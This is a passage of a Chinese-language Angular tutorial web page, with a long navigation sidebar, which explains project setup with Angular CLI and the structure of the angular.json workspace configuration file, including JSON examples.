href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#type类型实例化" class="sidebar-link">Type类型实例化</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#stringtoken的问题" class="sidebar-link">stringToken的问题</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#opaquetoken" class="sidebar-link">OpaqueToken</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#injectiontoken" class="sidebar-link">InjectionToken</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#multi-providers" class="sidebar-link">multi providers</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#providedin" class="sidebar-link">providedIn</a></li></ul></li><li><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#依赖注入原理-多级注入器" class="sidebar-link">依赖注入原理/多级注入器</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#注入器冒泡" class="sidebar-link">注入器冒泡</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#低层级覆盖上层级服务" class="sidebar-link">低层级覆盖上层级服务</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#两个注入器层次结构" class="sidebar-link">两个注入器层次结构</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#服务查找规则-令牌解析规则" class="sidebar-link">服务查找规则(令牌解析规则)</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#注入解析修饰符" class="sidebar-link">注入解析修饰符</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#指定ngmodule注入" class="sidebar-link">指定NgModule注入</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#viewproviders" class="sidebar-link">viewProviders</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#元素注入器" class="sidebar-link">元素注入器</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#一个元素注入器" class="sidebar-link">一个元素注入器</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#多级元素注入器" class="sidebar-link">多级元素注入器</a></li></ul></li><li><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#服务-代理" class="sidebar-link">服务/代理</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#httpclientmodule" class="sidebar-link">HttpClientModule</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#get-post-put-delete" class="sidebar-link">Get/Post/Put/Delete</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#httpparams" class="sidebar-link">HttpParams</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#fromstring" class="sidebar-link">fromString</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#fromobject" class="sidebar-link">fromObject</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#request" class="sidebar-link">request()</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#并行发送多个请求" class="sidebar-link">并行发送多个请求</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#顺序发送-http-请求" class="sidebar-link">顺序发送 Http 请求</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#获取顺序发送http请求结果" class="sidebar-link">获取顺序发送Http请求结果</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#http拦截器" class="sidebar-link">Http拦截器</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#authinterceptor" class="sidebar-link">AuthInterceptor</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#logginginterceptor" class="sidebar-link">LoggingInterceptor</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#cachinginterceptor" class="sidebar-link">CachingInterceptor</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#定制通用拦截器" class="sidebar-link">定制通用拦截器</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#http-进度事件" class="sidebar-link">Http 进度事件</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#代理" class="sidebar-link">代理</a></li></ul></li><li><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#表单" class="sidebar-link">表单</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#所有内置验证器-validators" class="sidebar-link">所有内置验证器(validators)</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#所有表单控制的状态" class="sidebar-link">所有表单控制的状态</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#模板式表单" class="sidebar-link">模板式表单</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#ngmodelgroup" class="sidebar-link">ngModelGroup</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#模板式指令" class="sidebar-link">模板式指令</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#响应式表单" class="sidebar-link">响应式表单</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#动态调整验证规则" class="sidebar-link">动态调整验证规则</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#获取from控件" class="sidebar-link">获取from控件</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#自定义验证器" class="sidebar-link">自定义验证器</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#自定义表单控件" class="sidebar-link">自定义表单控件</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#自定义验证组件" class="sidebar-link">自定义验证组件</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#跨字段验证" class="sidebar-link">跨字段验证</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#监听表单值的变化" class="sidebar-link">监听表单值的变化</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#创建formcontrol-formgroup" class="sidebar-link">创建FormControl/FormGroup</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#patchvalue-setvalue" class="sidebar-link">patchValue/setValue</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#ngmodeloptions" class="sidebar-link">ngModelOptions</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#ngmodelchange" class="sidebar-link">ngModelChange</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#ngmodel详解" class="sidebar-link">ngModel详解</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#相关源码定义" class="sidebar-link">相关源码定义</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#compositionstart-end" class="sidebar-link">compositionstart/end</a></li></ul></li><li><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#rxjs" class="sidebar-link">rxjs</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#meta-titleservice-详解" class="sidebar-link">Meta/TitleService 详解</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#meta" class="sidebar-link">meta</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#title" class="sidebar-link">Title</a></li></ul></li><li><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#app-initializer" class="sidebar-link">APP_INITIALIZER</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#网络连接状态组件" class="sidebar-link">网络连接状态组件</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#network-information-api" class="sidebar-link">Network Information API</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#开发网络连接组件" class="sidebar-link">开发网络连接组件</a></li></ul></li><li><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#animation" class="sidebar-link">animation</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#定义类和实现函数" class="sidebar-link">定义类和实现函数</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#动画函数" class="sidebar-link">动画函数</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#通配符-与void" class="sidebar-link">通配符*与void</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#enter-leave" class="sidebar-link">:enter/:leave</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#控制子元素动画禁用" class="sidebar-link">控制子元素动画禁用</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#禁用所有动画" class="sidebar-link">禁用所有动画</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#动画增加回调函数" class="sidebar-link">动画增加回调函数</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#关键帧动画" class="sidebar-link">关键帧动画</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#关键帧偏移" class="sidebar-link">关键帧偏移</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#路由转场动画" class="sidebar-link">路由转场动画</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#给组件绑定动画" class="sidebar-link">给组件绑定动画</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#group-stagger" class="sidebar-link">Group/Stagger</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#左前进右后退" class="sidebar-link">左前进右后退</a></li></ul></li><li><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#domsanitizer" class="sidebar-link">DomSanitizer</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#xss" class="sidebar-link">XSS</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#xss示例" class="sidebar-link">XSS示例</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#sanitize" class="sidebar-link">sanitize</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#自定义keephtml指令" class="sidebar-link">自定义keepHtml指令</a></li></ul></li><li><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#分析包" class="sidebar-link">分析包</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#webpack-bundle-analyzer" class="sidebar-link">webpack-bundle-analyzer</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#source-map-explorer" class="sidebar-link">source-map-explorer</a></li></ul></li><li><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#国际化" class="sidebar-link">国际化</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#ngx-translate" class="sidebar-link">ngx-translate</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#ngx-translate-extract" class="sidebar-link">ngx-translate-extract</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#translateservice-translatedirective" class="sidebar-link">TranslateService/TranslateDirective</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#懒加载模块国际化" class="sidebar-link">懒加载模块国际化</a></li></ul></li><li><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#异常处理" class="sidebar-link">异常处理</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#自定义异常处理器" class="sidebar-link">自定义异常处理器</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#异常处理机制" class="sidebar-link">异常处理机制</a></li></ul></li><li><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#网格拖拽" class="sidebar-link">网格拖拽</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#换肤方案" class="sidebar-link">换肤方案</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#自定义结构一键换肤" class="sidebar-link">自定义结构一键换肤</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#第三方ui一键换肤" class="sidebar-link">第三方ui一键换肤</a></li></ul></li><li><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#ngrx" class="sidebar-link">ngrx</a><ul class="sidebar-sub-headers"></ul></li></ul></div></li></ul> </div> <div class="page"> <div class="content__default"><h2 id="angular简介"><a href="#angular简介" class="header-anchor">#</a> angular简介</h2> <p>2009年谷歌发布Angular1，2016年9月Angular2正式版发布，Angular3由于在开发过程中出现问题（Router模块）被放弃，直接奔向4，2017年3月Angular4正式版发布，之后还有5、6、7，改动都不是很大，2019年5月28日，Angular8正式发布。截至2021年4月1日，angular最新版本angular11,ngrx11。其实这些版本中只有1.x是最特别的，因为1.x与2以及之后的版本完全不一样。
</p> <h2 id="开始项目"><a href="#开始项目" class="header-anchor">#</a> 开始项目</h2> <ol><li>安装node.js,Typescript,Angular-cli,创建新项目</li></ol> <div class="language- line-numbers-mode"><pre class="language-text"><code>npm install -g typescript
npm install -g @angular/cli
ng new 项目的名字
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p><img src="/vuebloger/img/post/20190608150210900.png" alt=""></p> <ol start="2"><li><code>ng serve</code>运行项目。<code>npm start</code>一样能启动项目，npm start是调的<code>ng serve</code></li></ol> <p><img src="/vuebloger/img/post/20190608151402992.png" alt=""></p> <h2 id="cli命令"><a href="#cli命令" class="header-anchor">#</a> cli命令</h2> <p>详解我的另外一篇<a href="/vuebloger/technology/angular-cli命令详解.html">anglular-cli详解</a>。</p> <h2 id="项目目录解析"><a href="#项目目录解析" class="header-anchor">#</a> 项目目录解析</h2> <p><img src="/vuebloger/img/post/20190608153038777.png" alt=""></p> <h2 id="angular-json全解"><a href="#angular-json全解" class="header-anchor">#</a> angular.json全解</h2> <p>这个文件是整个项目的概要，包含了 不同的环境，测试、代理、第三方资源 和 众多内置工具配置信息。类似于vue.config.js。查看<a href="/vuebloger/bake/实用片段备忘.html#单应用angular-json样例">angular.json样例</a></p> <p>自从Angular CLI v6-RC2发布之后,Angular CLI创建的项目架构已经发生变化。原有的 .angular-cli.json 已经被 angular.json 取代。</p> <p><img src="/vuebloger/img/post/4178189284-5b9084321ce2a_fix732.png" alt=""></p> <p>angular支持在一个单独的文件目录中，来管理多应用程序。Angular CLI项目开始也称 Angular 工作空间,一个工空间可以包含多个应用程序项目。运行<code>ng g application 项目名</code>默认会在根目录下projects下生成一个完整的新项目。运行打包时跟上项目名即可如<code>ng build 项目名</code>。 angular.json包含以下内容：</p> <h3 id="schema"><a href="#schema" class="header-anchor">#</a> $schema</h3> <p>JSON Schema 是一个允许我们注解和验证JSON数据格式的工具。Angular CLI使用它来强化对于Angular Workspace schema的解释说明。</p> <p><img src="/vuebloger/img/post/1598050363-5b908ce954c6c_fix732.gif" alt=""></p> <p>上述演示了JSON Schema自动填充和验证的功能.<code>$schema</code>属性 关联了JSON Schema在Angular CLI中的实施文件。</p> <h3 id="version"><a href="#version" class="header-anchor">#</a> version</h3> <p>指明了Angular 工作空间 概要的版本。</p> <h3 id="schematics"><a href="#schematics" class="header-anchor">#</a> schematics</h3> <p><code>schematics</code>属性 可以在工作空间的root level来配置Schematics packages的选项。假设我们要 保证 每一个组件用不同的默认设置 来创建。例如，使用默认 使用 OnPush作为检测策略，通过声明模块和导出组件。</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token string">&quot;schematics&quot;</span><span class="token operator">:</span> <span class="token punctuation">{</span>
  <span class="token string">&quot;@schematics/angular:component&quot;</span><span class="token operator">:</span> <span class="token punctuation">{</span>
    <span class="token string">&quot;changeDetection&quot;</span><span class="token operator">:</span> <span class="token string">&quot;OnPush&quot;</span><span class="token punctuation">,</span>
    <span class="token string">&quot;export&quot;</span><span class="token operator">:</span> <span class="token boolean">true</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><div class="custom-block tip"><p class="custom-block-title">温馨提示</p> <p>这个会在工作空间的任何 level 进行应用。</p></div> <h3 id="cli"><a href="#cli" class="header-anchor">#</a> cli</h3> <p>定义Angular CLI的配置。</p> <ul><li>packageManager 这个属性定义了Angular CLI使用的包管理工具，开执行命令，比如 <code>npm</code>,<code>yarn</code>.</li></ul> <h3 id="newprojectroot"><a href="#newprojectroot" class="header-anchor">#</a> newProjectRoot</h3> <p>这个属性定义了由CLI创建的新的内部应用和库放置的位置。默认值为<code>projects</code>.即多次项目默认生成项目后存放的位置。</p> <h3 id="projects"><a href="#projects" class="header-anchor">#</a> projects</h3> <p>这个属性包含了工作空间中所有项目的配置信息。包含一个个project/</p> <h3 id="project"><a href="#project" class="header-anchor">#</a> project</h3> <p>每一个项目的配置信息在下列属性中：</p> <ul><li>root  指定了项目文件的根文件夹，可能为空，但是它指定了一个特定的文件夹。多项目时&quot;root&quot;: &quot;projects/collage-manage-web&quot;,</li> <li>sourceRoot  指定了项目源文件位置,多项目时&quot;sourceRoot&quot;: &quot;projects/collage-manage-web/src&quot;,</li> <li>projectType 表明了 项目的状态 是 <code>appliaction</code>还是<code>library</code>。</li> <li>prefix 当CLI创建 <code>component</code>或者<code>directive</code>时，使用该属性作为标签前缀。</li> <li>schematics 配置 <code>Schematics packages</code>,同时指定Schematics配置默认值</li> <li>architect 任何项目都可以自定义 自动化命令，如 build、serve、test、lint等等。这些都是基于prebuilt builders ，叫做Architect Targets。</li></ul> <div class="language-js line-numbers-mode"><pre class="language-js"><code> <span class="token string">&quot;angular-cli-workspace-example&quot;</span><span class="token operator">:</span> <span class="token punctuation">{</span>
   <span class="token string">&quot;root&quot;</span><span class="token operator">:</span> <span class="token string">&quot;&quot;</span><span class="token punctuation">,</span>
   <span class="token string">&quot;sourceRoot&quot;</span><span class="token operator">:</span> <span class="token string">&quot;src&quot;</span><span class="token punctuation">,</span>
   <span class="token string">&quot;projectType&quot;</span><span class="token operator">:</span> <span class="token string">&quot;application&quot;</span><span class="token punctuation">,</span>
   <span class="token string">&quot;prefix&quot;</span><span class="token operator">:</span> <span class="token string">&quot;app&quot;</span><span class="token punctuation">,</span>
   <span class="token string">&quot;schematics&quot;</span><span class="token operator">:</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
   <span class="token string">&quot;architect&quot;</span><span class="token operator">:</span> <span class="token punctuation">{</span>
     <span class="token string">&quot;build&quot;</span><span class="token operator">:</span> <span class="token punctuation">{</span>
       <span class="token string">&quot;builder&quot;</span><span class="token operator">:</span> <span class="token string">&quot;@angular-devkit/build-angular:browser&quot;</span><span class="token punctuation">,</span>
       <span class="token string">&quot;options&quot;</span><span class="token operator">:</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
       <span class="token string">&quot;configurations&quot;</span><span class="token operator">:</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
     <span class="token punctuation">}</span><span class="token punctuation">,</span>
     <span class="token string">&quot;serve&quot;</span><span class="token operator">:</span> <span class="token punctuation">{</span>
       <span class="token string">&quot;builder&quot;</span><span class="token operator">:</span> <span class="token string">&quot;@angular-devkit/build-angular:dev-server&quot;</span><span class="token punctuation">,</span>
       <span class="token string">&quot;options&quot;</span><span class="token operator">:</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
       <span class="token string">&quot;configurations&quot;</span><span class="token operator">:</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
     <span class="token punctuation">}</span><span class="token punctuation">,</span>
     <span class="token string">&quot;extract-i18n&quot;</span><span class="token operator">:</span> <span class="token punctuation">{</span>
       <span class="token string">&quot;builder&quot;</span><span class="token operator">:</span> <span class="token string">&quot;@angular-devkit/build-angular:extract-i18n&quot;</span><span class="token punctuation">,</span>
       <span class="token string">&quot;options&quot;</span><span class="token operator">:</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
     <span class="token punctuation">}</span><span class="token punctuation">,</span>
     <span class="token string">&quot;test&quot;</span><span class="token operator">:</span> <span class="token punctuation">{</span>
       <span class="token string">&quot;builder&quot;</span><span class="token operator">:</span> <span class="token string">&quot;@angular-devkit/build-angular:karma&quot;</span><span class="token punctuation">,</span>
       <span class="token string">&quot;options&quot;</span><span class="token operator">:</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
     <span class="token punctuation">}</span><span class="token punctuation">,</span>
     <span class="token string">&quot;lint&quot;</span><span class="token operator">:</span> <span class="token punctuation">{</span>
       <span class="token string">&quot;builder&quot;</span><span class="token operator">:</span> <span class="token string">&quot;@angular-devkit/build-angular:tslint&quot;</span><span class="token punctuation">,</span>
       <span class="token string">&quot;options&quot;</span><span class="token operator">:</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
     <span class="token punctuation">}</span>
   <span class="token punctuation">}</span>
 <span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br></div></div><h3 id="schematics的工作区配置项"><a href="#schematics的工作区配置项" class="header-anchor">#</a> Schematics的工作区配置项</h3> 